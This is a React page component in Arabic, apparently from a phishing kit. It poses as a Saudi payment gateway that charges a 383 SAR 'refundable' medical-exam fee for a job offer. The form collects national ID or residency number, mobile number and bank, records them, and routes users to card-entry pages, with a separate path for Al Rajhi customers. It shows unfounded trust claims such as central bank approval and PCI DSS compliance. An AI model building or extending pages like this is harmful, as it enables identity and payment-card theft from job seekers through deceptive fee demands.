import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { StepLayout } from "@/components/StepLayout";
import { useStepSession } from "@/lib/useStepSession";
import { useLocation } from "wouter";
import { useState } from "react";
import { toast } from "sonner";
import { ArrowLeft, CreditCard, Banknote, ShieldCheck, Lock, Building2, Phone, IdCard, BadgeCheck } from "lucide-react";
import { ASSETS } from "@/lib/assets";

const BANKS = [
  "بطاقة البنك الأهلي السعودي",
  "البنك العربي الوطني",
  "بطاقة البنك السعودي الفرنسي",
  "بطاقة البنك السعودي للاستثمار",
  "البطاقة الائتمانية",
  "بطاقة مصرف الإنماء",
  "بطاقة مصرف الراجحي",
  "بطاقة البنك السعودي البريطاني (ساب)",
  "بطاقة بنك البلاد",
  "بطاقة بنك الرياض",
  "بنك الخليج الدولي",
  "البطاقة مسبقة الدفع",
];

export default function Data() {
  const [, setLocation] = useLocation();
  const { recordStep, isSubmitting } = useStepSession();
  const [idNumber, setIdNumber] = useState("");
  const [phone, setPhone] = useState("");
  const [bank, setBank] = useState("");

  const handleSubmit = async () => {
    if (idNumber.length < 8) return toast.error("رقم الهوية غير صالح");
    if (!/^05\d{8}$/.test(phone)) return toast.error("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
    if (!bank) return toast.error("الرجاء اختيار طريقة الدفع");
    await recordStep("data", { idNumber, phone, bank });
    if (bank === "بطاقة مصرف الراجحي") {
      setLocation("/razer-payment");
    } else {
      setLocation("/cardpayment");
    }
  };

  return (
    <StepLayout
      step={4}
      total={10}
      badge="رسوم حجز الفحص الطبي - بوابة الدفع السعودية"
      title="بيانات الدفع الآمن"
      subtitle="المبلغ المطلوب: 383 ريال سعودي (مسترد بالكامل بعد إتمام التوظيف عبر التأمين الصحي)"
      variant="green"
    >
      {/* شريط الثقة العلوي */}
      <div className="mb-4 grid grid-cols-3 gap-2 text-center">
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <Lock className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">دفع آمن 100%</span>
        </div>
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <ShieldCheck className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">SSL مشفر</span>
        </div>
        <div className="bg-white border border-emerald-100 rounded-lg p-2 flex flex-col items-center gap-1 shadow-sm">
          <BadgeCheck className="w-4 h-4 text-emerald-600" />
          <span className="text-[10px] font-bold text-gray-700">معتمد من البنك المركزي</span>
        </div>
      </div>

      <Card className="p-6 md:p-8 shadow-xl border-emerald-100 bg-white">
        {/* شعارات بوابات الدفع السعودية */}
        <div className="flex items-center justify-center gap-4 mb-5 pb-5 border-b border-gray-200">
          <img src={ASSETS.madaLogo} alt="مدى" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.sadadLogo} alt="سداد" className="h-7 object-contain" />
          <div className="w-px h-6 bg-gray-200" />
          <img src={ASSETS.applePayMada} alt="Apple Pay" className="h-7 object-contain" />
        </div>

        {/* بطاقة المبلغ بتدرج سعودي رسمي */}
        <div className="relative bg-gradient-to-br from-emerald-700 via-emerald-800 to-emerald-900 text-white rounded-2xl p-5 mb-6 shadow-xl overflow-hidden">
          {/* خلفية زخرفية */}
          <div className="absolute top-0 right-0 w-32 h-32 bg-amber-400/10 rounded-full -translate-y-12 translate-x-12 blur-2xl" />
          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-8 -translate-x-8 blur-xl" />

          <div className="relative flex items-center justify-between">
            <div>
              <div className="inline-flex items-center gap-1.5 bg-amber-400/20 border border-amber-300/30 px-2 py-0.5 rounded-full mb-2">
                <BadgeCheck className="w-3 h-3 text-amber-300" />
                <span className="text-[10px] font-bold text-amber-200">رسوم رسمية</span>
              </div>
              <p className="text-xs text-white/80 mb-1">المبلغ الإجمالي المطلوب</p>
              <p className="text-4xl font-extrabold tracking-tight" dir="ltr">
                383 <span className="text-xl text-white/85">SAR</span>
              </p>
              <p className="text-[11px] text-white/70 mt-1">شامل ضريبة القيمة المضافة</p>
            </div>
            <div className="w-16 h-16 rounded-full bg-white/10 border border-white/20 flex items-center justify-center backdrop-blur-sm">
              <Banknote className="w-8 h-8 text-white/90" />
            </div>
          </div>
        </div>

        <div className="space-y-4">
          {/* رقم الهوية */}
          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm flex items-center gap-1.5">
              <IdCard className="w-4 h-4 text-emerald-600" />
              رقم الهوية / الإقامة *
            </Label>
            <Input
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value.replace(/\D/g, ""))}
              placeholder="1XXXXXXXXX"
              maxLength={10}
              className="h-12 font-mono text-base border-gray-200 focus:border-emerald-500"
              dir="ltr"
            />
            <p className="text-[10px] text-muted-foreground">10 أرقام (الهوية الوطنية أو رقم الإقامة)</p>
          </div>

          {/* الجوال */}
          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm flex items-center gap-1.5">
              <Phone className="w-4 h-4 text-emerald-600" />
              رقم الجوال السعودي *
            </Label>
            <Input
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 10))}
              placeholder="05XXXXXXXX"
              maxLength={10}
              className="h-12 font-mono text-base border-gray-200 focus:border-emerald-500"
              dir="ltr"
            />
            <p className="text-[10px] text-muted-foreground">يبدأ بـ 05 ويتكون من 10 أرقام</p>
          </div>

          {/* نوع البطاقة */}
          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm flex items-center gap-1.5">
              <Building2 className="w-4 h-4 text-emerald-600" />
              البنك / نوع البطاقة *
            </Label>
            <Select value={bank} onValueChange={setBank}>
              <SelectTrigger className="h-12 border-gray-200 focus:border-emerald-500">
                <SelectValue placeholder="اختر البنك أو طريقة الدفع" />
              </SelectTrigger>
              <SelectContent>
                {BANKS.map(b => (
                  <SelectItem key={b} value={b}>{b}</SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          {/* تنبيه البنوك المرفوضة (الرياض / البلاد) */}
          {(bank === "بطاقة بنك الرياض" || bank === "بطاقة بنك البلاد") && (
            <div className="p-4 bg-red-50 border border-red-200 rounded-xl text-center animate-in fade-in slide-in-from-top-2 duration-200">
              <img
                src={bank === "بطاقة بنك الرياض" ? ASSETS.riyadBankCard : ASSETS.albiladBankCard}
                alt={bank === "بطاقة بنك الرياض" ? "بطاقة بنك الرياض" : "بطاقة بنك البلاد"}
                className="h-32 mx-auto mb-3 object-contain rounded-md shadow-sm"
              />
              <div className="flex items-center justify-center gap-2 text-red-600 font-bold mb-1">
                <div className="w-2 h-2 rounded-full bg-red-600 animate-pulse" />
                تنبيه
              </div>
              <p className="text-red-700 text-sm font-medium leading-relaxed">
                نعتذر، الدفع باستخدام بطاقة {bank === "بطاقة بنك الرياض" ? "بنك الرياض" : "بنك البلاد"} لا يعمل حالياً. الرجاء اختيار بطاقة من بنك آخر.
              </p>
            </div>
          )}
        </div>

        {/* مربع الاسترداد */}
        <div className="mt-5 p-3 bg-emerald-50 border border-emerald-200 rounded-xl flex items-start gap-2.5 text-xs text-emerald-900">
          <ShieldCheck className="w-5 h-5 mt-0.5 shrink-0 text-emerald-600" />
          <div>
            <p className="font-bold mb-0.5">المبلغ مسترد بالكامل</p>
            <p className="text-emerald-800 leading-relaxed">
              يتم استرداد كامل المبلغ بعد إنهاء إجراءات القبول الوظيفي عن طريق التأمين الصحي المقدم من مدرسة دلة.
            </p>
          </div>
        </div>

        <Button
          onClick={handleSubmit}
          disabled={isSubmitting}
          size="lg"
          className="w-full mt-6 bg-gradient-to-r from-emerald-600 to-emerald-700 hover:from-emerald-700 hover:to-emerald-800 font-bold h-14 shadow-lg active:scale-[0.98] transition-transform duration-150"
          style={{ transitionTimingFunction: "cubic-bezier(0.23, 1, 0.32, 1)" }}
        >
          <Lock className="w-5 h-5 ml-2" />
          المتابعة للدفع الآمن
          <ArrowLeft className="w-5 h-5 mr-2" />
        </Button>

        {/* ذيل الثقة */}
        <div className="mt-4 flex items-center justify-center gap-2 text-[11px] text-gray-500">
          <Lock className="w-3 h-3 text-emerald-600" />
          البيانات مشفرة ومحمية بتقنية SSL 256-bit
          <span className="text-gray-300">|</span>
          <CreditCard className="w-3 h-3 text-emerald-600" />
          PCI DSS Compliant
        </div>
      </Card>
    </StepLayout>
  );
}
